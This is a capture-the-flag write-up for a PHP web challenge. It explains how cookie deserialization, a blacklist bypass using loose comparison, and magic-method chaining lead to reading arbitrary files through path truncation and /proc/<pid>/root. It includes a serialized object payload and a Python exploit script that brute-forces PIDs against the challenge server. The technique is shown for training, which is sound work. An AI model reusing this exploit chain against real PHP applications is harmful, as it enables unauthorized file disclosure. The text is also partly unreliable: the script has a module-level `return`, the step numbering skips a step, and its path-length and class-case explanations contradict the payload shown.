# Clash of Flans — CTF Write-Up

**Category:** Web 
**Subject:** PHP Deserializatuin, type juggling, LFI + path truncation
**Difficulty:** Medium  

---

## Overview

Clash of Flans is a PHP web app where users can create a baker, make flans, and battle them against each other. The challenge involves chaining multiple PHP vulnerabilities to read `/flag.txt` from the server.

The vulnerability chain goes through:
1. A weak blacklist filter with a type juggling bug
2. Unsafe PHP deserialization from a cookie
3. A dynamic property access in `getSummary()` leading to `__get` on a `Baker` object
4. A Local File Inclusion (LFI) via `getClashSummaryByUuid()`

---

## Step 1 — Understanding the Codebase

The app has four main classes:

- **`Baker`** — manages flans, loads/saves state via a cookie, has `__get` and `__call` magic methods
- **`Flan`** — a flan object with stats, has a `__destruct` that echoes its name
- **`Clash`** — result of a battle between two flans, has `__toString` that calls `getSummary()`
- **`functions.php`** — helpers including `is_bad()`, `getCookie()`, `getParam()`, `battleFlans()`

The app serializes the player's flans into a cookie named `flans` and deserializes it on every request via `Baker::load()`.

---

## Step 2 — Identifying the Vulnerabilities

### Vulnerability 1 — Unsafe Deserialization

```php
public static function load($bakerName) {
    $baker = new Baker($bakerName);
    if (getCookie("flans")) {
        $data = unserialize(getCookie("flans")); // user-controlled cookie!
        if ($data !== false && is_array($data)) {
            $baker->flans = $data['flans'] ?? [];
        }
    }
    return $baker;
}
```

The cookie is directly passed to `unserialize()` with no validation. This means we can inject arbitrary PHP objects.

### Vulnerability 2 — Weak Blacklist (`is_bad`)

```php
function is_bad($param) {
    $blacklist = array('Clash', 'Baker');
    foreach ($blacklist as $word) {
        if (strpos($param, needle: $word) != false) { // bug: != instead of !==
            return true;
        }
    }
    return false;
}
```

The bug here is `!=` instead of `!==`. `strpos` returns `false` when the string is not found, and `0` when found at position 0. Since `0 != false` evaluates to `false` in PHP (loose comparison), a word found at position 0 is **not** blocked.

This means:
- `strpos("Clash...", "Clash") = 0` → `0 != false` → `false` → **not blocked**
- `strpos(array, "Baker")` on PHP 7.4 returns `false` with a warning (not a fatal error) → **not blocked**

### Vulnerability 3 — Dynamic Property Access in `getSummary()`

```php
public function getSummary() {
    $side = getParam("side");
    $side = $side ? $this->flan1->$side : "red"; // dynamic property access!
    return "Clash: {$this->flan1->getName()} ({$side} side) ...";
}
```

`$this->flan1->$side` accesses a property whose name comes from the `?side=` GET parameter. If `flan1` is a `Baker` object and `side` is a non-existent property name, PHP triggers `Baker::__get()`.

### Vulnerability 4 — `__get` Leads to LFI

```php
public function __get($name) {
    if (getParam("args")) {
        $args = explode(",", getParam("args")); // args from GET parameter
    }
    return call_user_func_array(array($this, "get" . $name), $args);
}
```

`__get` calls `$this->get{$name}($args)` where both the method name and arguments come from GET parameters. With `?side=ClashSummaryByUuid&args=../flag`, this becomes:

```php
$this->getClashSummaryByUuid("../flag")
```

### Vulnerability 5 — LFI in `getClashSummaryByUuid()`

```php
public static function getClashSummaryByUuid($uuid) {
    global $CLASH_DIR;
    $file = joinpath($CLASH_DIR . '/' . $uuid . '.cof');
    $file = substr($file, 0, 100);
    if (file_exists($file)) {
        return file_get_contents($file); // reads arbitrary files!
    }
    return null;
}
```

The `$uuid` value goes through `joinpath()` which resolves `..` segments — and the `.cof` extension is appended. So `../flag` becomes `flag.cof`, meaning the file path needs to account for this suffix when targeting the flag file.

---

## Step 3 — Building the Exploit Chain

The full chain looks like this:

```
Cookie (array bypass) → is_bad() bypassed
        ↓
unserialize() → Flan(name=Clash(flan1=Baker)) created in memory
        ↓
action=fight → battleFlans() → Clash.php loaded into memory
        ↓
exit() / end of script → Flan.__destruct()
        ↓
echo "{$this->name}" → Clash cast to string → __toString()
        ↓
Clash.__toString() → getSummary()
        ↓
?side=ClashSummaryByUuid → Baker->ClashSummaryByUuid (missing property)
        ↓
Baker.__get("ClashSummaryByUuid") with ?args=<path>
        ↓
getClashSummaryByUuid(<path>) → file_get_contents → FLAG
```

### Why the Array Cookie Trick?

The payload contains `Clash` and `Baker` class names, which would normally be blocked by `is_bad()`. But:

- Sending `flans[]=<payload>` makes `$_COOKIE["flans"]` an **array** in PHP
- `is_bad(array)` → `strpos(array, "Baker")` → PHP 7.4 returns `false` with a warning (no fatal error) → **bypassed**
- `getCookie()` calls `flatten()` which calls `implode(",", $array)` → returns the payload as a string
- `unserialize(payload_string)` → objects are created normally ✅

### Why `Clash` Needs to Be Loaded Before `__destruct`

PHP's autoloader is case-sensitive on Linux, so `clash.php` ≠ `Clash.php`. This means using lowercase `clash` in the serialized payload causes `__PHP_Incomplete_Class` errors.

The fix: include `action=fight` in the POST body. This triggers `battleFlans()`, which calls `new Clash(...)`, loading `Clash.php` **before** `__destruct` fires at the end of the script. Since `Baker` is already loaded via `Baker::load()`, `baker` (lowercase) in the serialized payload resolves to the `Baker` class already in memory.

### The Serialized Payload

```
a:2:{
  s:5:"flans"; a:1:{
    i:0; O:4:"Flan":4:{ /* real Flan for battleFlans */ }
  }
  s:4:"trap"; O:4:"Flan":4:{
    s:7:"\x00*\x00name"; O:5:"Clash":4:{
      s:8:"\x00*\x00flan1"; O:5:"baker":2:{
        s:7:"\x00*\x00name"; s:1:"x";
        s:8:"\x00*\x00flans"; a:0:{}
      }
      /* ... */
    }
    /* ... */
  }
}
```

The `trap` key holds a `Flan` whose `name` is a `Clash` object. When `Flan.__destruct()` fires and echoes `$this->name`, PHP casts the `Clash` object to string, triggering `Clash.__toString()` → `getSummary()`.

---

## Step 5 — The `joinpath` Trick and Path Truncation

The flag is written into a `.cof` file via `recordClash()` and then displayed in the match history on the main page. Two constraints made the path non-trivial to craft.

### Constraint 1 — `.cof` is always appended

```php
$file = joinpath($CLASH_DIR . '/' . $uuid . '.cof');
```

The function always appends `.cof` to whatever path we supply. So if we pass `../flag.txt`, the actual path becomes `flag.txt.cof`, which doesn't exist. We can't just strip the extension by ending with a null byte either — PHP 7.4 doesn't allow null bytes in file paths.

### Constraint 2 — `substr($file, 0, 100)` truncates the path

```php
$file = substr($file, 0, 100); // Should be enough
```

The path is truncated to 100 characters **after** `joinpath` resolves it. This is the key to the exploit: if the resolved path is exactly 100 characters and ends right before `.cof`, the `.cof` gets cut off.

### How `joinpath` Works

`joinpath` normalizes a path by resolving `..` segments:

```php
$path = preg_replace('#/{2,}#', '/', $path);     // collapse double slashes
$path = preg_replace('#\.{3,}#', '..', $path);   // collapse ... → ..
$path = preg_replace('#/(\./)+#', '/', $path);   // collapse /./
$path = trim($path, '/');                          // strip leading/trailing slashes
// then walks segments and resolves ..
```

The key detail: `trim($path, '/')` removes the leading slash, making the result a **relative path**. So the final path is relative to the current working directory of the PHP process (`/var/www/html/`).

### The `/proc/<pid>/root` Trick

Since the result is relative and we need to reach `/flag.txt`, we use `/proc/<pid>/root` as a symlink to the container root:

```
/proc/<pid>/root → /
/proc/<pid>/root/flag.txt → /flag.txt
```

But we need the resolved path (after `joinpath` strips leading `/`) to be **exactly 100 characters** so that `substr(..., 0, 100)` cuts off the `.cof` suffix, leaving us with `flag.txt`.

### PID Length Parity

The resolved path looks like:

```
proc/<pid>/root/proc/<pid>/root/flag.txt
```

- If `<pid>` is **2 digits** (e.g. `48`): path length ends at `...flag.tx` after truncation → missing the `t`
- If `<pid>` is **2 digits in first occurrence and 2 digits in second**: total length shifts

The trick is to **repeat the `/proc/<pid>/root/` segment twice** and pad the path with enough `../` at the beginning so that after `joinpath` resolves everything, the final string is exactly 100 characters and ends on `flag.txt` (not `flag.tx` or `flag.txt.`).

The winning path was:

```
../../../../../../../../../../../../../../../../../../../../../../../proc/{pid}/root/proc/{pid}/root/flag.txt
```

After `joinpath` resolves all the `..` traversals and the double `/proc/{pid}/root/` repetition, the result is:

```
proc/<pid>/root/proc/<pid>/root/flag.txt   ← exactly 100 chars for the right PID
```

And `substr(..., 0, 100)` cuts the string before `.cof` is reached, so `file_get_contents` reads the actual `/flag.txt` via the `/proc/<pid>/root` symlink.

### Why Fuzz the PID?

The PID affects the total length of the resolved path:
- A 1-digit PID makes the path shorter → truncation lands inside `flag.tx`
- A 2-digit PID lands on `flag.txt` ✅
- A 3-digit PID makes the path longer → truncation lands on `flag.txt.` or beyond

So the fuzzing loop from PID 1 to 100 is necessary to find the PID whose length makes the truncation land exactly on the `t` at the end of `flag.txt`.

---

```python
import requests
import re
from urllib.parse import quote

TARGET = "http://dyn-02.midnightflag.fr:11456"

FLANS_PAYLOAD = (
    "a%3A2%3A%7Bs%3A5%3A%22flans%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A4%3A%22Flan%22%3A4%3A%7B"
    "s%3A7%3A%22%00%2A%00name%22%3Bs%3A6%3A%22myflan%22%3Bs%3A7%3A%22%00%2A%00size%22%3B"
    "i%3A2%3Bs%3A9%3A%22%00%2A%00weight%22%3Bi%3A2%3Bs%3A13%3A%22%00%2A%00sturdiness%22%3B"
    "i%3A1%3B%7D%7Ds%3A4%3A%22trap%22%3BO%3A4%3A%22Flan%22%3A4%3A%7Bs%3A7%3A%22%00%2A%00"
    "name%22%3BO%3A5%3A%22Clash%22%3A4%3A%7Bs%3A8%3A%22%00%2A%00flan1%22%3BO%3A5%3A%22Baker"
    "%22%3A2%3A%7Bs%3A7%3A%22%00%2A%00name%22%3Bs%3A1%3A%22x%22%3Bs%3A8%3A%22%00%2A%00flans"
    "%22%3Ba%3A0%3A%7B%7D%7Ds%3A8%3A%22%00%2A%00flan2%22%3BO%3A4%3A%22Flan%22%3A4%3A%7B"
    "s%3A7%3A%22%00%2A%00name%22%3BN%3Bs%3A7%3A%22%00%2A%00size%22%3Bi%3A1%3Bs%3A9%3A%22"
    "%00%2A%00weight%22%3Bi%3A1%3Bs%3A13%3A%22%00%2A%00sturdiness%22%3Bi%3A1%3B%7Ds%3A13"
    "%3A%22%00%2A%00winnerName%22%3Bs%3A1%3A%22x%22%3Bs%3A16%3A%22%00%2A%00resultDetails"
    "%22%3Bs%3A1%3A%22x%22%3B%7Ds%3A7%3A%22%00%2A%00size%22%3Bi%3A1%3Bs%3A9%3A%22%00%2A"
    "%00weight%22%3Bi%3A1%3Bs%3A13%3A%22%00%2A%00sturdiness%22%3Bi%3A1%3B%7D%7D"
)

session = requests.Session()
r = session.post(TARGET + "/", data={"baker_name": "test"})
print(f"    Status: {r.status_code}")
print(f"    PHPSESSID: {session.cookies.get('PHPSESSID')}")


for pid in range(1, 101):
    path = f"../../../../../../../../../../../../../../../../../../../../../../../proc/{pid}/root/proc/{pid}/root/flag.txt"
    
    cookies = {
        "PHPSESSID": session.cookies.get("PHPSESSID"),
        "flans[]": FLANS_PAYLOAD,
    }

    r = session.post(
        TARGET + f"/?side=ClashSummaryByUuid&args={quote(path, safe='')}",
        data={"action": "fight"},
        cookies=cookies,
        allow_redirects=False
    )

    text = r.text
    if "flag" in text.lower() or "CTF{" in text or "FLAG{" in text or "MCTF{" in text:
        print(f"\nFLAG avec PID={pid}")
        print(text)
        return


print("\n[*] Fuzz terminé")
```

